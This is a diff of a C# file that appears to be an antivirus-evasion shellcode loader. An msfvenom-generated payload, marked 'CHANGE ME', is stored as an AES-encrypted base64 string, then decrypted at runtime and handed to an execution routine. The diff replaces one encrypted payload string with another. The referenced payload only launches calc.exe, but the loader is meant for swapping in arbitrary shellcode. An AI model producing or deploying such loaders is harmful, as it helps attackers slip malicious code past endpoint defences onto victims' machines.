@@ -65,8 +65,7 @@ namespace goodTimes
             else
             {
                 // msfvenom -p windows/exe cmd=calc.exe -f csharp --> CHANGE ME!
-                String hiphop = "ZxOy1BksVfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5RD0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP64kv5T7pX3iapVsX7ORmg7Ubfa1M9PcYNm5qzS9dyHxFdeD578YA6DGYC0UPzmeDXB11R0MWmPAkRGFftQp + YdurMHce1R4HC9bQ0gtm / MLHIP / UTPbIUtwrEAqQ / SYJcJCmeCPynYLNYrn9ae1xvCBokUTgdK + gpUa58ss2F4F60p1ujZNHmQ1Bn39WZmK5R4wSVmdFJpKRZXeGycAziEVlGjsS7XDKsvQvWvaZKqealuTWxH9q6n++zrRJZ0TBorjcFHKJZOLK5bNgKx0DbmFHXz + KBH400o";
-
+                String hiphop = "ZxOy1Bks+Vfrlq8wcmyHY8GwwiBZd8NGrGQiKvx15hcv9sQ9apoO6NGbNBxAeS4NLHSz4owcdPgQTTejYJr80Ke4ynoy41yrc5R+D0uqt1ppyxDAeYGATQy7xFbN247gwFee5cPZAFyBzbI6DvOLBFSJiP6+4kv5T7pX3iapVsWcXyXcRWqMlsUcogFWUVK+YDL4rwg8Dw4MO6+yHxvccHphUouhDHpZxYWZvKQWpOYurvu8XvbF9CcwR6U3G7UHu6gCczk7MLhQ8J0On72EEw==";
                 byte[] de_data = Decrypt(Convert.FromBase64String(hiphop), key, iv);
                 nonsense(de_data);
             }
